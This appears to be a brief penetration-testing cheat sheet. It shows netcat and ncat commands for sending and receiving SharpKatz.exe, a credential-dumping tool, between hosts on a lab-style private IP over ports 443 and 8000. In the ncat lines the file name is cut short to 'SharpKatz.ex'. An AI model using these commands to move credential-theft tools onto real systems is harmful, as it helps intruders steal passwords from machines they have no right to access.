## original netcat

sending file ...
```
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

receiving file ...
```
nc 192.168.49.128 443 > SharpKatz.exe
```

## ncat

sending file ...
```
ncat --send-only 192.168.49.128 8000 < SharpKatz.ex
```

receiving file ...
```
ncat 192.168.49.128 443 --recv-only > SharpKatz.ex
```
